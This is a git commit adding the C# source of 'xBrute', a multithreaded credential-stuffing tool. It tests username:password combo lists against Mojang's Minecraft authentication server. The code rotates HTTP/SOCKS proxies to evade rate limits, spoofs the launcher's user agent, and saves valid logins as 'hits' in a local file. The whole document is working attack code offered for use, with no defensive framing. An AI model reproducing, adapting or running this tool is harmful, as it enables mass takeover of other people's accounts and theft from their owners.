129106e9e775f4b7fc8dcb3f8d11e86ede3d0fca
Shouko-Nishimiya <79457569+Shouko-Nishimiya@users.noreply.github.com>
2021-02-27 22:15:42 +0000

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,117 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace xBrute
+{
+    class Program
+    {
+        [STAThread]
+        static void Main(string[] args)
+        {
+            Console.Title = "xBrute v0.02";
+	    Brute();
+            
+        }
+        public static void Brute()
+        {
+            Console.Clear();
+            Colorful.Console.Write("  [-] ", Color.Aqua);
+            Colorful.Console.Write("How many threads: ", Color.White);
+            try
+            {
+                Request.threads = int.Parse(Console.ReadLine());
+            }
+            catch
+            {
+                Request.threads = 80;
+            }
+
+            Console.Clear();
+            for (; ; )
+            {
+                Colorful.Console.Write("  [-] ", Color.Aqua);
+                Colorful.Console.Write("What type of proxies - HTTP | SOCKS4 | SOCKS5 -: ", Color.White);
+                Request.proxyType = Console.ReadLine();
+                Request.proxyType = Request.proxyType.ToUpper();
+                if (Request.proxyType.Contains("HTTP") || Request.proxyType.Contains("SOCKS4") || Request.proxyType.Contains("SOCKS5"))
+                {
+                    break;
+                }
+                Colorful.Console.Write("  > Please select a valid proxyType", Color.Red);
+            }
+
+            Thread.Sleep(2000);
+            Console.Clear();
+            Task.Factory.StartNew(delegate ()
+            {
+                Request.updateTitle();
+            });
+
+
+            string fileName;
+            OpenFileDialog openFileDialog = new OpenFileDialog();
+
+            do
+            {
+                Colorful.Console.Write("  [-] ", Color.Aqua);
+                Colorful.Console.Write("Load your combos..", Color.White);
+                Thread.Sleep(500);
+                openFileDialog.Title = "Select Combo List";
+                openFileDialog.DefaultExt = "txt";
+                openFileDialog.Filter = "Text files|*.txt";
+                openFileDialog.RestoreDirectory = true;
+                openFileDialog.ShowDialog();
+                fileName = openFileDialog.FileName;
+            }
+            while (!File.Exists(fileName));
+
+            Request.comboList = new List<string>(File.ReadAllLines(fileName));
+            Request.LoadCombos(fileName);
+
+            Colorful.Console.Write("\n  > ", Color.Aqua);
+            Colorful.Console.Write("Succesfully Loaded " + Request.totalCounter + " Combo lines", Color.White);
+
+            Thread.Sleep(1000);
+            Console.Clear();
+            do
+            {
+                Colorful.Console.Write("  [-] ", Color.Aqua);
+                Colorful.Console.Write("Load your proxies..", Color.White);
+                Thread.Sleep(500);
+                openFileDialog.Title = "Select Proxy List";
+                openFileDialog.DefaultExt = "txt";
+                openFileDialog.Filter = "Text files|*.txt";
+                openFileDialog.RestoreDirectory = true;
+                openFileDialog.ShowDialog();
+                fileName = openFileDialog.FileName;
+            }
+            while (!File.Exists(fileName));
+
+            Request.proxyList = new List<string>(File.ReadAllLines(fileName));
+            Request.Loadproxies(fileName);
+            Colorful.Console.Clear();
+
+            Colorful.Console.Write("  > ", Color.Aqua);
+            Colorful.Console.Write("Succesfully Loaded " + Request.proxyTotalCounter + " Proxy lines", Color.White);
+
+            Thread.Sleep(1000);
+            Console.Clear();
+
+            for (int i = 0; i <= Request.threads; i++)
+            {
+                new Thread(new ThreadStart(Request.Check)).Start();
+            }
+
+            Colorful.Console.ReadLine();
+            Environment.Exit(0);
+        }
+    }
+    
+}
---
+++ Request.cs
@@ -0,0 +1,219 @@
+﻿using Leaf.xNet;
+using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace xBrute
+{
+    class Request
+    {
+        public static int badCounter = 0;
+        public static int Expired = 0;
+        public static int hitCounter = 0;
+        public static int errorCounter = 0;
+        public static int totalCounter = 0;
+        public static int checkedCounter = 0;
+        public static int comboNumber = 0;
+        public static List<string> proxyList = new List<string>();
+        public static int proxyNumber = 0;
+        public static int threads;
+        public static string proxyType;
+        public static int proxyTotalCounter = 0;
+        public static int stopCount = 0;
+        public static List<string> comboList = new List<string>();
+        public static int CPM = 0;
+        public static int CPM_aux = 0;
+        public static string hitCombos;
+        public static string badCombos;
+        public static int retriecounter;
+
+        public static int nfaCounter;
+        public static int sfaCounter;
+        public static int demoCounter;
+
+        public static void LoadCombos(string fileName)
+        {
+            using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+            {
+                using (BufferedStream bufferedStream = new BufferedStream(fileStream))
+                {
+                    using (StreamReader streamReader = new StreamReader(bufferedStream))
+                    {
+                        while (streamReader.ReadLine() != null)
+                        {
+                            Request.totalCounter++;
+                        }
+                    }
+                }
+            }
+        }
+
+        public static void Loadproxies(string fileName)
+        {
+            using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+            {
+                using (BufferedStream bufferedStream = new BufferedStream(fileStream))
+                {
+                    using (StreamReader streamReader = new StreamReader(bufferedStream))
+                    {
+                        while (streamReader.ReadLine() != null)
+                        {
+                            Request.proxyTotalCounter++;
+                        }
+                    }
+                }
+            }
+        }
+
+        public static void updateTitle()
+        {
+            for (; ; )
+            {
+                Request.CPM = Request.CPM_aux;
+                Request.CPM_aux = 0;
+                Colorful.Console.Title = string.Format("xBrute v0.02- Checked: {0} ~ Hits: {1} ~ NFA: {2} ~ SFA: {3} ~ Retires: {4} ~ Errors: {5} ~ CPM: ", new object[]
+                {
+                    Request.checkedCounter,
+                    Request.hitCounter,
+                    Request.nfaCounter,
+                    Request.sfaCounter,
+                    Request.retriecounter,
+                    Request.errorCounter,
+                }) + Request.CPM * 60;
+                Thread.Sleep(1000);
+            }
+        }
+
+        public static void Check()
+        {
+            int retries = 2;
+            for (int i = 0; i < retries + 1; i++)
+            {
+                for (; ; )
+                {
+                    if (Request.proxyNumber > Request.proxyList.Count<string>() - 2)
+                        Request.proxyNumber = 0;
+                    try
+                    {
+                        Interlocked.Increment(ref Request.proxyNumber);
+                        using (HttpRequest req = new HttpRequest())
+                        {
+                            if (Request.comboNumber > Request.comboList.Count<string>())
+                            {
+                                ++Request.stopCount;
+                                break;
+                            }
+                            Interlocked.Increment(ref Request.comboNumber);
+                            string[] strArray = Request.comboList[Request.comboNumber].Split(':');
+                            string str1 = strArray[0] + ":" + strArray[1];
+                            try
+                            {
+                                req.IgnoreProtocolErrors = true;
+                                req.KeepAlive = true;
+
+                                if (Request.proxyType == "HTTP")
+                                    req.Proxy = (ProxyClient)HttpProxyClient.Parse(Request.proxyList[Request.proxyNumber]);
+                                if (Request.proxyType == "SOCKS4")
+                                    req.Proxy = (ProxyClient)Socks4ProxyClient.Parse(Request.proxyList[Request.proxyNumber]);
+                                if (Request.proxyType == "SOCKS5")
+                                    req.Proxy = (ProxyClient)Socks5ProxyClient.Parse(Request.proxyList[Request.proxyNumber]);
+
+                                req.UserAgent = "Minecraft Launcher/2.1.1351 (6371f5d03a) Windows (10.0; x86)";
+                                req.AddHeader("Accept", "application/json, text/plain, */*");
+
+                                string post = "{\"agent\":{\"name\":\"Minecraft\",\"version\":1},\"username\":\"" + strArray[0] + "\",\"password\":\"" + strArray[1] + "\",\"requestUser\":true}";
+
+                                string str2 = req.Post("https://authserver.mojang.com/authenticate", post, "application/json;charset=UTF-8").ToString();
+
+
+                                if (str2.Contains("Invalid credentials") || str2.Contains("error\":\"ForbiddenOperationException") || str2.Contains("403"))
+                                {
+
+                                    Request.CPM_aux++;
+                                    Request.checkedCounter++;
+                                    Request.badCounter++;
+                                }
+                                else if (str2.Contains("accessToken"))
+                                {
+                                    try
+                                    {
+                                        Request.CPM_aux++;
+                                        Request.checkedCounter++;
+                                        Request.hitCounter++;
+                                        Colorful.Console.WriteLine("[HIT] ", strArray[0] + ":" + strArray[1], Color.Green);
+                                        Hits(str1);
+                                    }
+                                    catch
+                                    {
+                                        Colorful.Console.WriteLine("[ERROR] ", strArray[0] + ":" + strArray[1], Color.Red);
+                                    }
+                                }
+
+
+
+
+                                else
+                                {
+                                    retriecounter++;
+                                    Request.comboList.Add(str1);
+                                }
+
+                            }
+                            catch (Exception ex)
+                            {
+                                Interlocked.Increment(ref Request.errorCounter);
+                                Request.comboList.Add(str1);
+                            }
+                        }
+                        continue;
+                    }
+                    catch (Exception ex)
+                    {
+                        Interlocked.Increment(ref Request.errorCounter);
+                    }
+                }
+            }
+        }
+
+
+        public static void Hits(string account)
+        {
+            try
+            {
+                Directory.CreateDirectory("Brute_Mode_Results");
+                using (StreamWriter sw = File.AppendText("/Brute.txt"))
+                {
+                    sw.WriteLine(account);
+                }
+            }
+            catch
+            {
+
+            }
+        }
+
+
+
+
+
+
+
+        private static string Parse(string source, string left, string right)
+        {
+            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
+            {
+                right
+            }, StringSplitOptions.None)[0];
+        }
+
+
+
+
+    }
+}
